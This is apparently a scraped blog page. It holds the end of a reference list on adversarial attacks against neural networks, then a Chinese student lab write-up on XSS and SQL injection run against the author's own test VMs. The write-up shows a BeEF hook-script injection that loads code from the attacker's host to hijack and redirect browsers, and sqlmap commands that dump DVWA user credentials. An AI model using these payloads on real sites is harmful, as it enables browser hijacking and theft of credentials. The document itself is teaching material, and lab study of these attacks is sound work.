and Robustness Correlated?, In IEEE International Conference on Machine Learning and Applications, pp. 227-232, 2016.[98] H. Hosseini, B. Xiao, M. Jaiswal, R. Poovendran, On the Limitation of Convolutional Neural Networks in Recognizing Negative Images, arXiv preprint arXiv:1703.06857, 2017.[99] M. Cisse, P. Bojanowski, E. Grave, Y. Dauphin, N. Usunier, Par- seval Networks: Improving Robustness to Adversarial Examples, arXiv preprint arXiv:1704.08847, 2017.[100] N. Cheney, M. Schrimpf, G. Kreiman, On the Robustness of Convolutional Neural Networks to Internal Architecture and Weight Perturbations, arXiv preprint arXiv:1703.08245, 2017.[101] H. Lee, S. Han, J. Lee, Generative Adversarial Trainer: Defense to Adversarial Perturbations with GAN, arXiv preprint arXiv:1705.03387, 2017.[102] A. Rozsa, M. Gunther, T. E. Boult, Towards Robust Deep Neural Networks with BANG, arXiv preprint arXiv:1612.00138, 2017.[103] T. Miyato, S. Maeda, M. Koyama, S. Ishii, Virtual Adversarial Training: a Regularization Method for Supervised and Semi-supervised Learning, arXiv preprint 1704.03976, 2017.[104] D. Arpit, S. Jastrzebski, N. Ballas, D. Krueger, E. Bengio, M. S. Kanwal, T. Maharaj, A. Fischer, A. Courville, Y. Bengio, S. Lacoste- Julien, A Closer Look at Memorization in Deep Networks, arXiv preprint arXiv:1706.05394, 2017.[105] X. Li, F. Li, Adversarial Examples Detection in Deep Networks with Convolutional Filter Statistics, In Proceedings of International Con- ference on Computer Vision, 2017.[106] T. Lee, M. Choi, S. Yoon, Manifold Regularized Deep Neural Networks using Adversarial Examples, arXiv preprint arXiv:1511.06381, 2016.[107] K. Grosse, N. Papernot, P. Manoharan, M. Backes, and P. McDaniel, Adversarial examples for malware detection, In European Sym- posium on Research in Computer Security, pp. 62-79. 2017.[108] N. Papernot, and P. McDaniel, On the effectiveness of defensive distillation, arXiv preprint arXiv:1607.05113, 2016.[109] N. Papernot, Patrick McDaniel, and Ian Goodfellow, Transfer- ability in machine learning: from phenomena to black-box attacks using adversarial samples, arXiv preprint arXiv:1605.07277, 2016.[110] N. Papernot, P. McDaniel, A. Swami, and R. Harang, Crafting adversarial input sequences for recurrent neural networks, In IEEE Military Communications Conference, pp. 49-54, 2016.[111] N. Papernot, I. Goodfellow, R. Sheatsley, R. Feinman, and P.McDaniel. Cleverhans v1. 0.0: an adversarial machine learning library,arXiv preprint arXiv:1610.00768, 2016.[112] I. Goodfellow, N. Papernot, and P. McDaniel, cleverhans v0. 1: an adversarial machine learning library, arXiv preprint arXiv:1610.00768, 2016.[113] T. Miyato, A. M. Dai, and Ian Goodfellow, Adversarial Train- ing Methods for Semi-Supervised Text Classification, arXiv preprint arXiv:1605.07725, 2016.[114] A. Nguyen, J. Yosinski, and J. Clune, Deep neural networks are easily fooled: High confidence predictions for unrecognizable images, In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pp. 427-436, 2015.[115] C. Xie, J. Wang, Z. Zhang, Y. Zhou, L. Xie, and A. Yuille, Adversarial Examples for Semantic Segmentation and Object Detection, arXiv preprint arXiv:1703.08603, 2017.[116] S. Zheng, Y. Song, T. Leung, and I. Goodfellow, Improving the ro- bustness of deep neural networks via stability training, In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pp. 4480-4488, 2016.[117] P. Tabacof, and E. Valle, Exploring the space of adversarial images, In IEEE International Joint Conference on Neural Networks, pp. 426-433, 2016.[118] A. Fawzi, O. Fawzi, and P. Frossard, Fundamental limits on ad- versarial robustness, In Proceedings of ICML, Workshop on Deep Learning. 2015.[119] Y. Luo, Xavier Boix, Gemma Roig, Tomaso Poggio, and Qi Zhao, Foveation-based mechanisms alleviate adversarial examples, arXiv preprint arXiv:1511.06292, 2015.[120] J. Jin, A. Dundar, and E. Culurciello, Robust convolutional neural networks under adversarial noise, arXiv preprint arXiv:1511.06306, 2015.[121] J. Kos, I. Fischer, and D. Song, Adversarial examples for generative models, arXiv preprint arXiv:1702.06832, 2017.[122] Q. Wang, W. Guo, K. Zhang, I. I. Ororbia, G. Alexander, X. Xing, C. L. Giles, and X Liu, Adversary Resistant Deep Neural Networks with an Application to Malware Detection, arXiv preprint arXiv:1610.01239, 2016.[123] G. K. Dziugaite, Z. Ghahramani, and D. M. Roy, A study of the effect of JPG compression on adversarial images, arXiv preprint arXiv:1608.00853, 2016.[124] A. Nayebi, and S. Ganguli, Biologically inspired protection of deep networks from adversarial attacks, arXiv preprint arXiv:1703.09202, 2017.[125] W. Hu, and Y. Tan, Generating Adversarial Malware Examples for Black-Box Attacks Based on GAN, arXiv preprint arXiv:1702.05983, 2017.[126] G. Katz, C. Barrett, D. L. Dill, K. Julian, and M. J. Kochenderfer, Towards proving the adversarial robustness of deep neural networks, arXiv preprint arXiv:1709.02802, 2017.[127] D. Krotov, and J. J. Hopfield. Dense Associative Memory is Robust to Adversarial Inputs, arXiv preprint arXiv:1701.00939, 2017.[128] P. Tabacof, T. Julia, E. Valle, Adversarial images for variational autoencoders, arXiv preprint arXiv:1612.00155, 2016.[129] Q. Wang, W. Guo, I. I. Ororbia, G. Alexander, X. Xing, L. Lin, C. L. Giles, X. Liu, P. Liu, and G. Xiong, Using non-invertible data transformations to build adversary-resistant deep neural networks, arXiv preprint arXiv:1610.01934, 2016.[130] A. Rozsa, M. Geunther, E. M. Rudd, and T. E. Boult. ”Facial at- tributes: Accuracy and adversarial robustness.” Pattern Recognition Letters (2017).[131] M. Cisse, Y. Adi, N. Neverova, and J. Keshet, Houdini: Fooling deep structured prediction models, arXiv preprint arXiv:1707.05373, 2017.[132] F. Tramer, N. Papernot, I. Goodfellow, D. Boneh, and P. Mc- Daniel, The Space of Transferable Adversarial Examples, arXiv preprint arXiv:1704.03453, 2017.[133] S. J. Oh, M. Fritz, and B. Schiele, Adversarial Image Perturbation for Privacy Protection–A Game Theory Perspective, arXiv preprint arXiv:1703.09471, 2017.[134] Y. Lin, Z. Hong, Y. Liao, M. Shih, M. Liu, and M. Sun, Tactics of Adversarial Attack on Deep Reinforcement Learning Agents, arXiv preprint arXiv:1703.06748, 2017.[135] K. R. Mopuri, U. Garg, and R. V. Babu, Fast Feature Fool: A data independent approach to universal adversarial perturbations, arXiv preprint arXiv:1707.05572, 2017.[136] N. Kardan, and K. O. Stanley, Mitigating fooling with competitive overcomplete output layer neural networks, In International Joint Con- ference on Neural Networks pp. 518-525, 2017.[137] Y. Dong, H. Su, J. Zhu, and F. Bao, Towards Interpretable Deep Neural Networks by Leveraging Adversarial Examples, arXiv preprint arXiv:1708.05493, 2017.[138] Q. Wang, W. Guo, K. Zhang, I. I. Ororbia, G. Alexander, X. Xing, C. L. Giles, and X. Liu, Learning Adversary-Resistant Deep Neural Networks, arXiv preprint arXiv:1612.01401, 2016.[139] J. Gao, B. Wang, Z. Lin, W. Xu, and Y. Qi, DeepCloak: Masking Deep Neural Network Models for Robustness Against Adversarial Samples, (2017).[140] W. Xu, D. Evans, and Y. Qi, Feature Squeezing Mitigates and Detects Carlini&#x2F;Wagner Adversarial Examples, arXiv preprint arXiv:1705.10686, 2017.[141] W. Bai, C. Quan, and Z. Luo, Alleviating adversarial attacks via convolutional autoencoder, In International Conference on Soft- ware Engineering, Artificial Intelligence, Networking and Paral- lel&#x2F;Distributed Computing (SNPD), pp. 53-58, 2017.[142] A. P. Norton, Y. Qi, Adversarial-Playground: A visualization suite showing how adversarial examples fool deep learning, In IEEE Sympo- sium on Visualization for Cyber Security, pp. 1-4, 2017.[143] Y. Dong, F. Liao, T. Pang, X. Hu, and J. Zhu, Discovering Adversar- ial Examples with Momentum, arXiv preprint arXiv:1710.06081, 2017. [144] S. Shen, R. Furuta, T. Yamasaki, and K. Aizawa, Fooling Neural Networks in Face Attractiveness Evaluation: Adversarial Examples with High Attractiveness Score But Low Subjective Score, In IEEE ThirdInternational Conference on Multimedia Big Data, pp. 66-69, 2017. [145] C. Szegedy, V. Vincent, S. Ioffe, J. Shlens, and Z. Wojna. Rethinking the inception architecture for computer vision, In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pp.2818-282, 2016.[146] S. Sarkar, A. Bansal, U. Mahbub, and R. Chellappa, UPSET andANGRI: Breaking High Performance Image Classifiers, arXiv preprintarXiv:1707.01159, 2017.[147] K. He, X. Zhang, S. Ren, and J. Sun, Deep residual learning for imagerecognition, In Proceedings of the IEEE conference on computervision and pattern recognition, pp. 770-778, 2016.[148] S. Das, and P. N. Suganthan, Differential evolution: A survey of thestate-of-the-art, IEEE transactions on evolutionary computation vol.15, no. 1, pp. 4-31, 2011.[149] J. Redmon and A. Farhadi. Yolo9000: better, faster, stronger, arXivpreprint arXiv:1612.08242, 2016.[150] S. Ren, K. He, R. Girshick, and J. Sun, Faster r-cnn: Towards real-time object detection with region proposal networks, In Advances inneural information processing systems, pages 91-99, 2015.[151] D. Amodei, R. Anubhai, E. Battenberg, C. Case, J. Casper, B. Catanzaro, J. Chen, M. Chrzanowski, A. Coates, G. Diamos. Deep speech 2: End-to-end speech recognition in English and Mandarin, arXivpreprint arXiv:1512.02595, 2015.[152] A. Krizhevsky, Learning multiple layers of features from tiny image,2009.[153] Diederik P Kingma and Max Welling, Auto-encoding variationalbayes, arXiv preprint arXiv:1312.6114, 2013.[154] Y. Bengio, Learning deep architectures for AI, Foundations andtrends in Machine Learning vol. 2, no. 1, pp. 1-127, 2009.[155] D. E. Rumelhart, G. E. Hinton, and R. J. Williams, Learning representations by back-propagating errors, Cognitive modeling, vol.5, 1988.[156] S. Hochreiter and J. Schmidhuber, Long short-term memory, Neuralcomputation, vol. 9, no. 8, pp. 1735-1780, 1997.[157] M. Volodymyr, K. Kavukcuoglu, D. Silver, A. A. Rusu, J. Veness,M. G. Bellemare, A. Graves, M. Riedmiller, A. K. Fidjeland, G. Ostrovski, Human-level control through deep reinforcement learning, Nature, vol. 518, no. 7540, pp. 529-533, 2015.[158] M. Volodymyr, A. P. Badia, and M. Mirza, Asynchronous methods for deep reinforcement learning In International Conference on Ma- chine Learning, 2016.[159] J. Long, E. Shelhamer, and T. Darrell, Fully convolutional networks for semantic segmentation, In Proceedings of IEEE Conference on Computer Vision and Pattern Recognition, 2015.[160] A. Rozsa,M. Gunther, E. M. Rudd, and T. E. Boult, Are facial attributes adversarially robust? In International Conference on Pattern Recognition, pp. 3121-3127, 2016.[161] Z. Liu, P. Luo, X. Wang, X. Tang, Deep learning face attributes in the wild, International Conference on Computer Vision, pp. 3730-3738, 2015.[162] V. Mirjalili, and A. Ross, Soft Biometric Privacy: Retaining Biometric Utility of Face Images while Perturbing Gender, In International Joint Conference on Biometrics, 2017.[163] K. Simonyan and A. Zisserman, Very deep convolutional networks for largescale image recognition, in Proceedings of the International Conference on Learning Representations, 2015.[164] D. Krotov, and J.J. Hopfield, Dense Associative Memory for Pattern Recognition, In Advances in Neural Information Processing Systems, 2016.[165] R. Hahnloser, R. Sarpeshkar, M. A. Mahowald, R. J. Douglas, H.S. Seung, Digital selection and analogue amplification coexist in a cortex- inspired silicon circuit, Nature, vol. 405. pp. 947-951.[166] G. Hinton, O. Vinyals, and J. Dean, Distilling the knowledge in a neural network, in Deep Learning and Representation Learning Workshop at NIPS 2014. arXiv preprint arXiv:1503.02531, 2014.[167] H. Drucker, Y.Le Cun, Improving generalization performance using double backpropagation, IEEE Transactions on Neural Networks vol. 3, no. 6, pp. 991-997, 1992.[168] G. Huang, Z. Liu, K. Q. Weinberger, and L. Maaten, Densely connected convolutional networks, arXiv preprint arXiv:1608.06993, 2016.[169] A. N. Bhagoji, D. Cullina, C. Sitawarin, P. Mittal, Enhancing Robustness of Machine Learning Systems via Data Transformations, arXiv preprint arXiv:1704.02654, 2017.[170] Y. Dong, F. Liao, T. Pang, H. Su, X. Hu, J. Li, J. Zhu, Boosting Adversarial Attacks with Momentum, arXiv preprint arXiv:1710.06081, 2017.[171] I. Goodfellow, J. P. Abadie, M. Mirza, B. Xu, D. Warde-Farley, S. Ozair, A. Courville, and Y. Bengio, Generative adversarial nets, In Advances in neural information processing systems, pp. 2672-2680, 2014.[172] K. Jelena and C. Amina, An introduction to frames. Foundations and Trends in Signal Processing, 2008.[173] S. Rifai, P. Vincent, X. Muller, X. Glorot, and Y. Bengio, Contractive auto-encoders: Explicit invariance during feature extraction, In Proceed- ings of International Conference on Machine Learning, pp. 833 - 840, 2011.[174] S. S. Liew, M. Khalil-Hani, and R. Bakhteri, Bounded activation functions for enhanced training stability of deep neural networks on visual pattern recognition problems, Neurocomputing, vol. 216, pp. 718-734, 2016.[175] M. Abbasi, C. Gagne, Robustness to adversarial examples through an ensemble of specialists, arXiv preprint arXiv:1702.06856, 2017.[176] A. Mogelmose, M. M. Trivedi, and T. B. Moeslund, Vision-based traffic sign detection and analysis for intelligent driver assistance systems: Perspectives and survey, In IEEE Transaction on Intelligent Trans- portation Systems, vol. 13, no. 4, pp. 1484-1497, 2012.[177] A. Vedaldi and K. Lenc, MatConvNet – Convolutional Neural Networks for MATLAB, In Proceeding of the ACM International Conference on Multimedia, 2015.[178] J. Yangqing, E. Shelhamer, J. Donahue, S. Karayev, J. Long, R. Girshick, S. Guadarrama, T. Darrell, Caffe: Convolutional Architecture for Fast Feature Embedding, arXiv preprint arXiv:1408.5093, 2014.[179] M. Abadi, A. Agarwal, P. Barham, E. Brevdo, Z. Chen, C. Citro, G. S. Corrado, A. Davis, J. Dean, M. Devin, S. Ghemawat, I. Good- fellow, A. Harp, G. Irving, M. Isard, R. Jozefowicz, Y. Jia, L. Kaiser, M. Kudlur, J. Levenberg, D. Mane, M Schuster, R. Monga, S. Moore, D. Murray, C. Olah, J. Shlens, B. Steiner, I. Sutskever, K. Talwar, P. Tucker, V. Vanhoucke, V. Vasudevan, F. Viegas, O. Vinyals, P. Warden, M. Wattenberg, M. Wicke, Y. Yu, and X. Zheng, TensorFlow: Large-scale machine learning on heterogeneous systems, 2015. Software available from tensorflow.org.[180] A. Giusti, J. Guzzi, D. C. Ciresan, F. He, J. P. Rodriguez, F. Fontana, M. Faessler, A machine learning approach to visual perception of forest trails for mobile robots, IEEE Robotics and Automation Letters, vol. 1, no. 2, pp. 661 - 667, 2016.[181] Objects Detection Machine Learning TensorFlow Demo, https:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id&#x3D;org.tensorflow. detect&amp;hl&#x3D;en, Accessed December 2017.[182] Class central, Deep Learning for Self-Driving Cars, https:&#x2F;&#x2F;www.class- central.com&#x2F;mooc&#x2F;8132&#x2F; 6- s094- deep- learning- for- self- driving- cars, Accessed December 2017.[183] C. Middlehurst, China unveils world’s first facial recognition ATM, http:&#x2F;&#x2F;www.telegraph.co.uk&#x2F;news&#x2F;worldnews&#x2F;asia&#x2F;china&#x2F; 11643314&#x2F;China-unveils-worlds-first-facial-recognition-ATM. html, 2015.[184] About Face ID advanced technology, https:&#x2F;&#x2F;support.apple. com&#x2F;en-au&#x2F;HT208108, Accessed December 2017.[185] M. Sharif, S. Bhagavatula, L. Bauer, and M. K. Reiter, Accessorize to a crime: Real and stealthy attacks on state-of-the-art face recognition, In Proceedings of ACM SIGSAC Conference on Computer and Communications Security, pp. 1528-1540, 2016.[186] R. Shin and D. Song, JPEG-resistant adversarial images, In MAchine LEarning and Computer Security Workshop, 2017.[187] W. Brendel and M. Bethge Comment on ”Biologically inspired protection of deep networks from adversarial attacks”, arXiv preprint arXiv:1704.01547, 2017.[188] N. Carlini, D. Wagner, MagNet and ”Efficient Defenses Against Adversarial Attacks” are Not Robust to Adversarial Examples, arXiv preprint arXiv:1711.08478, 2017.[189] A. Raghunathan, J. Steinhardt, P. Liang, Certified Defenses against Adversarial Examples, arXiv preprint arXiv:1801.09344. 2018.[190] V. Khrulkov and I. Oseledets, Art of singular vectors and universal adversarial perturbations, arXiv preprint arXiv:1709.03582, 2017. [191] X. Huang, M. Kwiatkowska, S. Wang, M. Wu, Safety Verificationof Deep Neural Networks, In 29th International Conference on Com-puter Aided Verification, pages 3-29, 2017.[192] M. Wicker, X. Huang, and M. Kwiatkowska, Feature-Guided Black-Box Safety Testing of Deep Neural Networks, In 24th International Conference on Tools and Algorithms for the Construction and Analysis of Systems, 2018.[193] K. R. Mopuri, U. Ojha, U. Garg, V. Babu, NAG: Network for Adversary Generation, arXiv preprint arXiv:1712.03390, 2017.[194] A. G. Ororbia II, C. L. Giles and D Kifer, Unifying Adversarial Training Algorithms with Flexible Deep Data Gradient Regularization, arXiv preprint arXiv:1601.07213, 2016.[195] Y. Yoo, S. Park, J. Choi, S. Yun, N. Kwak, Butterfly Effect: Bidirectional Control of Classification Performance by Small Additive Perturbation, arXiv preprint arXiv:1711.09681, 2017. 1","categories":[{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/categories/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}],"tags":[{"name":"论文阅读","slug":"论文阅读","permalink":"http://blog.keter.top/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"},{"name":"神经网络对抗攻击","slug":"神经网络对抗攻击","permalink":"http://blog.keter.top/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}]},{"title":"「白帽子学习笔记」XSS和SQL注入","slug":"【白帽子学习笔记】XSS和SQL注入","date":"2020-11-17T06:01:02.000Z","updated":"2021-08-17T09:03:52.000Z","comments":true,"path":"2020/11/17/【白帽子学习笔记】XSS和SQL注入/","link":"","permalink":"http://blog.keter.top/2020/11/17/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/","excerpt":"¶【白帽子学习笔记】XSS和SQL注入 yysy姚总布置的实验报告越来越难写了，菜菜的我要写好久，┭┮﹏┭┮ @[toc] ¶0x01 实验知识点 ¶1x01 什么是XSS？ XSS又叫CSS (Cross Site Script) 也称为跨站，它是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。 XSS攻击是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。 ¶1x02 什么是Cookie？ Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。","text":"¶【白帽子学习笔记】XSS和SQL注入 yysy姚总布置的实验报告越来越难写了，菜菜的我要写好久，┭┮﹏┭┮ @[toc] ¶0x01 实验知识点 ¶1x01 什么是XSS？ XSS又叫CSS (Cross Site Script) 也称为跨站，它是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。 XSS攻击是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。 ¶1x02 什么是Cookie？ Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。 ¶1x03 XSS漏洞的分类 存储型 XSS：交互形Web应用程序出现后，用户就可以将一些数据信息存储到Web服务器上，例如像网络硬盘系统就允许用户将自己计算机上的文件存储到网络服务器上，然后与网络上的其他用户一起分享自己的文件信息。这种接收用户信息的Web应用程序由于在使用上更加贴近用户需求，使用灵活，使得其成为现代化Web领域的主导。在这些方便人性化的背后也带来了难以避免的安全隐患。 如果有某个Web应用程序的功能是负责将用户提交的数据存储到数据库中，然后在需要时将这个用户提交的数据再从数据库中提取出返回到网页中，在这个过程中，如果用户提交的数据中包含一个XSS攻击语句，一旦Web应用程序准备将这个攻击语句作为用户数据返回到网页中，那么所有包含这个回显信息的网页将全部受到XSS漏洞的影响，也就是说只要一个用户访问了这些网页中的任何一个，他都会遭受到来自该Web应用程序的跨站攻击。Web应用程序过于相信用户的数据，将其作为一个合法信息保存在数据库中，这等于是将一个定时炸弹放进了程序的内部，只要时机一到，这颗定时炸弹就会爆炸。这种因为存储外部数据而引发的XSS漏洞称为Web应用程序的Stored XSS漏洞，即存储型XSS漏洞。 存储型XSS漏洞广泛出现在允许Web用户自定义显示信息及允许Web用户上传文件信息的Web应用程序中，大部分的Web应用程序都属于此类。有一些Web应用程序虽然也属于此类，但是由于该Web应用程序只接受单个管理员的用户数据，而管理员一般不会对自己的Web应用程序做什么破坏，所以这种Web应用程序也不会遭到存储型XSS漏洞的攻击。 DOM-Based XSS漏洞： DOM是Document Object Model（文档对象模型）的缩写。根据W3C DOM规范（http://www.w.org.DOM/）,DOM是一种与浏览器、平台、语言无关的接口，使得网页开发者可以利用它来访问页面其他的标准组件。简单解释，DOM解决了Netscape的JavaScript和Microsoft的JScrtipt之间的冲突，给予Web设计师和开发者一个标准的方法，让他们来访问他们站点中的数据、脚本和表现层对象。 由于DOM有如此好的功能，大量的Web应用程序开发者在自己的程序中加入对DOM的支持，令人遗憾的是,Web应用程序开发者这种滥用DOM的做法使得Web应用程序的安全也大大降低，DOM-Based XSS正是在这样的环境下出现的漏洞。DOM-Based XSS漏洞与Stored XSS漏洞不同，因为他甚至不需要将XSS攻击语句存入到数据库中，直接在浏览器的地址栏中就可以让Web应用程序发生跨站行为。对于大多数的Web应用程序来说，这种类型的XSS漏洞是最容易被发现和利用的。 **反射型XSS：**仅对当次的页面访问产生影响。使得用户访问一个被攻击者篡改后的链接(包含恶意脚本)，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。 关于反射型的XSS漏洞，我之前的博客也有进行整理，链接如下 【白帽子学习笔记13】DVWA 反射型XSS（跨站点脚本攻击） ¶1x04 SQL注入攻击 所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。 为什么会有SQL注入攻击？ 很多电子商务应用程序都使用数据库来存储信息。不论是产品信息，账目信息还是其它类型的数据，数据库都是Web应用环境中非常重要的环节。SQL命令就是前端Web和后端数据库之间的接口，使得数据可以传递到Web应用程序，也可以从其中发送出来。需要对这些数据进行控制，保证用户只能得到授权给他的信息。可是，很多Web站点都会利用用户输入的参数动态的生成SQL查询要求，攻击者通过在URL、表格域，或者其他的输入域中输入自己的SQL命令，以此改变查询属性，骗过应用程序，从而可以对数据库进行不受限的访问。 因为SQL查询经常用来进行验证、授权、订购、打印清单等，所以，允许攻击者任意提交SQL查询请求是非常危险的。通常，攻击者可以不经过授权，使用SQL输入从数据库中获取信息。 关于SQL注入的常用语法我也有进行整理，链接如下： 【白帽子学习笔记14】SQL注入常用语句 【白帽子学习笔记15】XVWA SQL Injection ¶0x02 XSS部分：Beef ¶1x01 搭建GuestBook网站 本次实验中我在Win Server 2003中搭建了Guestbook环境（IIS），搭建过程中需要注意以下几点 在搭建IIS配置完成后注意将网站所在的文件夹权限打开，将Everyone用户组给到改文件夹的完全控制权限。 如果使用Windows Server可能需要手动配置一下IP和网关使其与其他虚拟机处于同一网段。 本次实验中虚拟机网络模式：Net模式 ¶1x02 AWVS扫描 首先我们使用AWVS扫描刚才搭建的网站 接下来一路继续就行，可能需要添加一个密码。然后就可以正常进行扫描了，扫描结果如下： 发现在error.asp和add.asp分别都有一个XSS漏洞。 ¶1x03 Kail中使用Beef生成恶意代码 现在Kail-2020中应该是没有自带Beef了，我们需要自己安装一下 sudo apt-get install beef-xss 然后cd进入到这个文件夹中： cd /usr/share/beef-xss 输入： ./beef即可启动 第一次的时候可能会提醒你不要使用默认的账号和密码，就像下面这样： 我们进入到提示的文件夹中进行一下修改 用vim打开一下：sudo vim /etc/beef-xss/config.yaml 不会使用vim的建议百度搜索一下用法，linux下经常会用到。 我把账号和密码都修改为了beeff，之后保存退出。再输入 ./beef 使用默认用户可能会导致你安装失败 输入su然后输入root密码，切换为root权限，然后再输入./beef 会提示你现在已经启动了，然后打开kali中自带的firefox浏览器。进入到： http://127.0.0.1:3000/ui/authentication 输入你刚才设置的账号和密码，就可以成功的登陆了。 访问一下hook.js里面有自带的恶意代码 只要访问到这个网站，对方的浏览器就会被劫持。 ¶1x04 XSS注入漏洞 ¶2x01 XSS劫持网站 现在使用自己的本机访问留言簿的网站，并将XSS注入恶意代码。 XSS注入代码如下： &lt;script src=&quot;http://Kali的IP地址:3000/hook.js&quot;&gt;&lt;/script&gt; 现在进入到这个当中我们可以发现已经成功了，而且看不到刚才写的代码，说明代码已经被成功的加载进去了！ 刷新一下界面，可以发现会有一个弹框： 然后再回到kali里面的beef管理界面看一下，可以发现10.34.80.1也就是我的本机已经被劫持了！ 可以使用他干一些奇怪的事情，还有查询一些信息 ¶2x02 劫持浏览器指定被劫持网站为学校主页 在命令中选择，Redirect Browser，填入学校地址，然后点击Execute。就可以发现网页被重定向了。 本次实验中的XSS攻击属于注入型XSS攻击。 ¶0x02 SQL注入（DVWA+SQLMAP+Mysql） ¶1x01 实验环境搭建 打开Metasploitable2后，里面有搭建好的DVWA，访问http://Metasploitable的IP/dvwa即可 在low级别的SQL Injection中进行SQL注入的尝试： 输入1，可以正常显示： 输入1’ 报错 可以判断此处有报错： 下面使用sqlmap进行攻击 SQLMAP基本语法： -u:指定目标URL –cookie：当前会话的cookies值 -b：获取数据库类型，检查数据库管理系统标识 –current-db：获取当前数据库 –current-user：获取当前数据库使用的用户 -string：当查询可用来匹配页面中的字符串 -users：枚举DBMS用户 -password：枚举DBMS用户密码hash ¶1x02 枚举当前数据库名称和用户名 查询一下当前的数据库： sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; --current-db -u后是需要攻击的url 因为dvwa是需要登陆的，需要cookie用作身份验证，可以通过浏览器F12抓包获取 –current-db表示查询当前数据库 然后查询一下当前的使用者： sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; --current-user ¶1x03 枚举数据库用户名和密码 枚举数据库的表名： 因为我们是dvwa所以爆破dvwa数据库中的数据表 sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa --tables 枚举数据表中的列名： 根据上面的枚举结果，我们应该是要看users数据表中的内容： sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa -T users --columns 枚举数据表中的用户和密码： 查询到users数据表中有那么多的字段，我们想要的数据应该就在user和password中了 sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa -T users -C user,password --dump 这里会询问你是否使用Kali中自带的字典进行攻击，选择是就好了 最后得到结果： ¶0x03 实验小结 在本次的实验中学习了两种最常见的漏洞：XSS漏洞和SQL注入漏洞，在实验过程中具体的掌握了如下知识点： 如何使用扫描器AWVS 如何向网站中注入XSS漏洞 如何使用Beef利用网站中的XSS漏洞 